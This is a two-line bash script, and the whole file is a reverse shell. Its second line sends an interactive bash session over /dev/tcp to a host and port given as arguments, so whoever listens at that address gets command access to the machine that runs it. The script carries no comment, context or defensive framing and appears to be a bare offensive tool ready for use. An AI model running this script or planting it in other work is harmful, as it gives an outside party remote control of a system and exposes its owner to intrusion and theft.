#!/bin/bash
bash -c "bash &>/dev/tcp/$1/$2 <&1"
